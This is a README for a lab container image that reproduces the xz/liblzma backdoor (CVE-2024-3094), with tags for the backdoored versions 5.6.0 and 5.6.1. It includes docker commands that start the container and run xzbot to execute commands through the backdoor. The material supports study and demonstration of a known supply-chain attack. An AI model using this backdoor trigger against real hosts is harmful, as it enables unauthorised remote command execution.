# xz backdoor container image

The container image of [xz](https://tukaani.org/xz-backdoor/) backdoor ([CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094)) based on an amazing work from [@amlweems](https://github.com/amlweems)'s [xzbot](https://github.com/amlweems/xzbot) project that can be run on both *x86_64* and *Apple Silicon* (via QEMU or rosetta).

> THIS IS FOR LEARNING PURPOSE ONLY!

## Demo
![xz-backdoor demo](.github/demo.gif)

## Overview
The `xz-backdoor` container images don't rely on `systemd` due to the fact that the exploit can be triggered with only just `sshd` if certain conditions are met.
As a result, it allows us to start the container without `--privileged` flag which is considered insecure.

### Versions
Both versions of the xz-backdoor are available as image tags.

* 5.6.0
* 5.6.1 (`latest`)

## Getting started

### Prerequisites

* [docker](https://www.docker.com/) or [podman](https://podman.io/docs/installation).
* Read [xzbot](https://github.com/amlweems/xzbot)'s documentation.

### Usage
**1. Start the container image**

> [!TIP]
> A specific version of liblzma can be specified via image tag e.g. `rezigned/xz-backdoor:5.6.0`.

```sh
docker run --rm -it -d \
  --name xz-backdoor \
  --platform linux/amd64 \
  rezigned/xz-backdoor:latest
```

**2. Run a command via `xzbot`**

> [!NOTE]
> The output of the default command (`id`) is redirected to `/tmp/.xz`.
>
> See https://github.com/amlweems/xzbot for more details.

```sh
# default command `id > /tmp/.xz`
docker exec -it `docker ps -f name=xz-backdoor -q` ./xzbot

# custom command
docker exec -it `docker ps -f name=xz-backdoor -q` ./xzbot -cmd "uname -a > /tmp/.xz"
```

## Acknowledgements
* https://edofic.com/posts/2021-09-12-podman-m1-amd64/
* https://github.com/amlweems/xzbot
* https://www.openwall.com/lists/oss-security/2024/03/29/4
* https://github.com/LewisGaul/systemd-containers
